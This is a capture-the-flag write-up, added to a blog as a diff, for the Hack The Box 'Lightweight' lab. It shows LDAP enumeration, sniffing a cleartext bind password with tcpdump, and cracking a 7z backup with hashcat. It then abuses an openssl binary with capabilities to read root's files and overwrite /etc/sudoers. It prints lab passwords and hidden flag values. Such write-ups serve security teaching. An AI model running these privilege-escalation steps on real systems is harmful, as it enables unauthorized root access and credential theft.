@@ -1,0 +1,337 @@
+---
+layout: default
+title: Lightweight
+---
+
+<div class="pretty-font">
+<h1>Lightweight</h1>
+<p class="date">11/05/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/lightweight/lightweight.png">
+
+<p>To get user in Lightweight we will have to play around with <code>ldap</code> service and inspect traffic with <code>tcpdump</code>. Then, to escalate privileges, crack a <code>7z</code> password protected, search for files with capabilities and play with <code>openssl</code> commands.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>First run <code>nmap</code> to see we have <code>ssh/22</code>, <code>http/80</code> and <code>ldap/389</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lightweight# nmap -sC -sV 10.10.10.119
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-15 07:57 UTC
+Nmap scan report for 10.10.10.119
+Host is up (0.12s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
+|   256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
+|_  256 31:6c:c1:eb:3b:28:0f:ad:d5:79:72:8f:f5:b5:49:db (ED25519)
+80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
+|_http-title: Lightweight slider evaluation page - slendr
+389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
+| ssl-cert: Subject: commonName=lightweight.htb
+| Subject Alternative Name: DNS:lightweight.htb, DNS:localhost, DNS:localhost.localdomain
+| Not valid before: 2018-06-09T13:32:51
+|_Not valid after:  2019-06-09T13:32:51
+|_ssl-date: TLS randomness does not represent time
+</pre>
+
+<p>If we run <code>ldap-search</code> script from <code>nmap</code> we can get the following information.</p>
+
+<pre class="prettyprint long">
+root@kali:~/htb/lightweight# nmap -p 389 --script ldap-search 10.10.10.119
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-15 10:06 UTC
+Nmap scan report for 10.10.10.119
+Host is up (0.15s latency).
+
+PORT    STATE SERVICE
+389/tcp open  ldap
+| ldap-search: 
+|   Context: dc=lightweight,dc=htb
+|     dn: dc=lightweight,dc=htb
+|         objectClass: top
+|         objectClass: dcObject
+|         objectClass: organization
+|         o: lightweight htb
+|         dc: lightweight
+|     dn: cn=Manager,dc=lightweight,dc=htb
+|         objectClass: organizationalRole
+|         cn: Manager
+|         description: Directory Manager
+|     dn: ou=People,dc=lightweight,dc=htb
+|         objectClass: organizationalUnit
+|         ou: People
+|     dn: ou=Group,dc=lightweight,dc=htb
+|         objectClass: organizationalUnit
+|         ou: Group
+|     dn: uid=ldapuser1,ou=People,dc=lightweight,dc=htb
+|         uid: ldapuser1
+|         cn: ldapuser1
+|         sn: ldapuser1
+|         mail: ldapuser1@lightweight.htb
+|         objectClass: person
+|         objectClass: organizationalPerson
+|         objectClass: inetOrgPerson
+|         objectClass: posixAccount
+|         objectClass: top
+|         objectClass: shadowAccount
+|         userPassword: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
+|         shadowLastChange: 17691
+|         shadowMin: 0
+|         shadowMax: 99999
+|         shadowWarning: 7
+|         loginShell: /bin/bash
+|         uidNumber: 1000
+|         gidNumber: 1000
+|         homeDirectory: /home/ldapuser1
+|     dn: uid=ldapuser2,ou=People,dc=lightweight,dc=htb
+|         uid: ldapuser2
+|         cn: ldapuser2
+|         sn: ldapuser2
+|         mail: ldapuser2@lightweight.htb
+|         objectClass: person
+|         objectClass: organizationalPerson
+|         objectClass: inetOrgPerson
+|         objectClass: posixAccount
+|         objectClass: top
+|         objectClass: shadowAccount
+|         userPassword: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
+|         shadowLastChange: 17691
+|         shadowMin: 0
+|         shadowMax: 99999
+|         shadowWarning: 7
+|         loginShell: /bin/bash
+|         uidNumber: 1001
+|         gidNumber: 1001
+|         homeDirectory: /home/ldapuser2
+|     dn: cn=ldapuser1,ou=Group,dc=lightweight,dc=htb
+|         objectClass: posixGroup
+|         objectClass: top
+|         cn: ldapuser1
+|         userPassword: {crypt}x
+|         gidNumber: 1000
+|     dn: cn=ldapuser2,ou=Group,dc=lightweight,dc=htb
+|         objectClass: posixGroup
+|         objectClass: top
+|         cn: ldapuser2
+|         userPassword: {crypt}x
+|_        gidNumber: 1001
+</pre>
+
+<p>We have two users <code>ldapuser1</code> and <code>ldapuser2</code> with their hashed passwords. We could try to crack them, but it's not the intended way.</p>
+
+<p>In port 80 we have a simple php website.</p>
+
+<img class="img-fluid" src="/static/img/htb/lightweight/1.png">
+
+<p>The Info page informs us the website is protected against bruteforging, if we try to run any web scanning tool we'll be banned for a couple of minutes being unable to access.</p>
+
+<img class="img-fluid" src="/static/img/htb/lightweight/2.png">
+
+<p>Going to the user page we can see a user in the machine has been automatically added for us.</p>
+
+<img class="img-fluid" src="/static/img/htb/lightweight/3.png">
+
+<p>We can <code>ssh</code> with our IP as user and password as the user page said.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lightweight# ssh 10.10.16.35@10.10.10.119
+10.10.16.35@10.10.10.119's password: 10.10.16.35
+[10.10.16.35@lightweight ~]$ 
+</pre>
+
+<p>Once inside, we can use <code>tcpdump</code> to inspect traffic. If we filter by <code>ldap</code> connections, we will see the following request when someone accesses <code>/user.php</code> (we will see the reason later).</p>
+
+<pre class="prettyprint">
+[10.10.16.35@lightweight /]$ tcpdump -i any -X port ldap
+...
+16:44:01.708890 IP lightweight.htb.43156 > lightweight.htb.ldap: Flags [P.], seq 1:92, ack 1, win 683, options [nop,nop,TS val 66819651 ecr 66819651], length 91
+	0x0000:  4500 008f 7d79 4000 4006 93ee 0a0a 0a77  E...}y@.@......w
+	0x0010:  0a0a 0a77 a894 0185 0650 eb35 33dd 408a  ...w.....P.53.@.
+	0x0020:  8018 02ab 2983 0000 0101 080a 03fb 9643  ....)..........C
+	0x0030:  03fb 9643 3059 0201 0160 5402 0103 042d  ...C0Y...`T....-
+	0x0040:  7569 643d 6c64 6170 7573 6572 322c 6f75  uid=ldapuser2,ou
+	0x0050:  3d50 656f 706c 652c 6463 3d6c 6967 6874  =People,dc=light
+	0x0060:  7765 6967 6874 2c64 633d 6874 6280 2038  weight,dc=htb..8
+	0x0070:  6263 3832 3531 3333 3261 6265 3164 3766  bc8251332abe1d7f
+	0x0080:  3130 3564 3365 3533 6164 3339 6163 3200  105d3e53ad39ac2.
+	0x0090:  0000 0000 0000 0000 0000 0000 0000 00    ...............
+...
+</pre>
+
+<p>Here we have <code>ldapuser2</code> password in plain text now, so we can use <code>su</code> to change our user (<code>ssh</code> is disabled for this user).</p>
+
+<pre class="prettyprint">
+[10.10.16.35@lightweight tmp]$ su ldapuser2
+Password: 8bc8251332abe1d7f105d3e53ad39ac2
+[ldapuser2@lightweight tmp]$ 
+</pre>
+
+<p>The user flag is in <code>ldapuser2</code> home directory.</p>
+
+<pre class="prettyprint">
+[ldapuser2@lightweight ~]$ cat user.txt 
+<span flag="8a866d3bb7e13a57aaeb110297f48026">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>Besides the flag, we have a <code>backup.7z</code> file owned by root.</p>
+
+<pre class="prettyprint">
+[ldapuser2@lightweight ~]$ ls -la
+total 1884
+drwx------.  4 ldapuser2 ldapuser2     197 Jun 21  2018 .
+drwxr-xr-x. 41 root      root         4096 Feb 18 16:37 ..
+-rw-r--r--.  1 root      root         3411 Jun 14  2018 backup.7z
+-rw-------.  1 ldapuser2 ldapuser2       0 Jun 21  2018 .bash_history
+-rw-r--r--.  1 ldapuser2 ldapuser2      18 Apr 11  2018 .bash_logout
+-rw-r--r--.  1 ldapuser2 ldapuser2     193 Apr 11  2018 .bash_profile
+-rw-r--r--.  1 ldapuser2 ldapuser2     246 Jun 15  2018 .bashrc
+drwxrwxr-x.  3 ldapuser2 ldapuser2      18 Jun 11  2018 .cache
+drwxrwxr-x.  3 ldapuser2 ldapuser2      18 Jun 11  2018 .config
+-rw-rw-r--.  1 ldapuser2 ldapuser2 1520530 Jun 13  2018 OpenLDAP-Admin-Guide.pdf
+-rw-rw-r--.  1 ldapuser2 ldapuser2  379983 Jun 13  2018 OpenLdap.pdf
+-rw-r--r--.  1 root      root           33 Jun 15  2018 user.txt
+</pre>
+
+<p>Move it to our machine encoding it to <code>base64</code> and copy pasting the result.</p>
+
+<pre class="prettyprint">
+[ldapuser2@lightweight ~]$ base64 -w 0 backup.7z 
+N3q8ryccAAQmbxM1EA0AAAAAAAAjAAAAAAAAAI5s6D0e1KZKLpqLx2...
+</pre>
+
+<pre class="prettyprint">
+root@kali:~/htb/lightweight# echo -n N3q8ryccAAQmbxM1EA0AAAAAAAAjAAAAAAAAAI5s6D0e1KZKLpqLx2... |base64 -d > backup.7z
+</pre>
+
+<p>The compressed file is locked by a password, so I used <a href="https://github.com/philsmd/7z2hashcat" target="_blank">7z2hashcat</a> to retrieve the <code>hashcat</code> hash.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lightweight# perl 7z2hashcat.pl backup.7z > backup.hash
+</pre>
+
+<p>Now use <code>hashcat</code> with the retrieved hash to obtain the password (<code>delete</code>).</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lightweight# hashcat -m 11600 backup.hash /usr/share/wordlists/rockyou.txt --force
+hashcat (v5.1.0) starting...
+$7z$2$19$0$$8$11e...71eb$4218$03:delete
+</pre>
+
+<p>Extract the files from the <code>7z</code> to get <code>index.php</code>, <code>info.php</code>, <code>reset.php</code>, <code>status.php</code> and <code>user.php</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lightweight# 7z e backup.7z -pdelete
+</pre>
+
+<p>Those files seem to be a backup of the website code. If we read <code>status.php</code> we can see <code>ldapuser1</code> credentials.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lightweight# cat status.php 
+...
+$username = 'ldapuser1';
+$password = 'f3ca9d298a553da117442deeb6fa932d';
+$ldapconfig['host'] = 'lightweight.htb';
+$ldapconfig['port'] = '389';
+$ldapconfig['basedn'] = 'dc=lightweight,dc=htb';
+//$ldapconfig['usersdn'] = 'cn=users';
+$ds=ldap_connect($ldapconfig['host'], $ldapconfig['port']);
+...
+</pre>
+
+<p>Once again, use <code>su</code> to change the user, because we have <code>ssh</code> also disabled for <code>ldapuser1</code>.</p>
+
+<pre class="prettyprint">
+[10.10.16.35@lightweight /]$ su ldapuser1
+Password: f3ca9d298a553da117442deeb6fa932d
+[ldapuser1@lightweight /]$ 
+</pre>
+
+<p>If we run <code>getcap</code> to find files with capabilites we see <code>/home/ldapuser1/tcpdump</code> and <code>/home/ldapuser1/openssl</code>. We didn't see those binaries before because they are under <code>ldapuser1</code> home directory.</p>
+
+<pre class="prettyprint">
+[ldapuser1@lightweight ~]$ getcap -r / 2>/dev/null
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/sbin/mtr = cap_net_raw+ep
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
+/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep
+/home/ldapuser1/openssl =ep
+</pre>
+
+<p>We can use <code>openssl</code> to read files as a privileged user and we could run the following command to read root's flag.</p>
+
+<pre class="prettyprint">
+[ldapuser1@lightweight ~]$ /home/ldapuser1/openssl base64 -in /root/root.txt | base64 -d
+</pre>
+
+<p>But we're going to get a root's shell instead, because with <code>openssl</code> we can also edit files, so let's add our user to <code>sudoers</code>.</p>
+
+<p>First create a file which will have the desired contents of <code>sudoers</code> (encoded in <code>base64</code>).</p> 
+
+<pre class="prettyprint">
+[ldapuser1@lightweight tmp]$ echo -ne "root\tALL=(ALL) ALL\n\"10.10.16.35\"\tALL=(ALL) ALL\n%sudo\tALL=(ALL) ALL\n" | base64 > caca
+</pre>
+
+<p>Now use <code>openssl</code> to read that file, decode it and put the result in <code>/etc/sudoers</code>.</p>
+
+<pre class="prettyprint">
+[ldapuser1@lightweight tmp]$ /home/ldapuser1/openssl base64 -d -in /tmp/caca -out /etc/sudoers
+</pre>
+
+<p>We can read that file to verify our user is now there.</p>
+
+<pre class="prettyprint">
+[ldapuser1@lightweight tmp]$ /home/ldapuser1/openssl base64 -in /etc/sudoers | base64 -d
+root	ALL=(ALL) ALL
+"10.10.16.35"	ALL=(ALL) ALL
+%sudo	ALL=(ALL) ALL
+</pre>
+
+<p>Now we can execute everything as a privileged user with our user.</p>
+
+<pre class="prettyprint">
+[10.10.16.35@lightweight ~]$ sudo -l
+[sudo] password for 10.10.16.35: 
+User 10.10.16.35 may run the following commands on lightweight:
+    (ALL) ALL
+[10.10.16.35@lightweight ~]$ sudo su
+[root@lightweight 10.10.16.35]#
+</pre>
+
+<p>Now we can see the real website code, and observe that when we visit <code>status.php</code> <code>ldapuser2</code> connects to <code>ldap</code>, that's why we could see that traffic through <code>tcpdump</code>.</p>
+
+<pre class="prettyprint">
+[root@lightweight ~]# cat /var/www/html/status.php
+...
+$username = 'ldapuser2';
+$password = '8bc8251332abe1d7f105d3e53ad39ac2';
+$ldapconfig['host'] = 'lightweight.htb';
+$ldapconfig['port'] = '389';
+$ldapconfig['basedn'] = 'dc=lightweight,dc=htb';
+//$ldapconfig['usersdn'] = 'cn=users';
+$ds=ldap_connect($ldapconfig['host'], $ldapconfig['port']);
+...
+</pre>
+
+<p>We have root's flag in his directory.</p>
+
+<pre class="prettyprint">
+[root@lightweight ~]# cat root.txt 
+<span flag="f1d4e309c5a6b3fffff74a8f4b2135fa">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+</div>
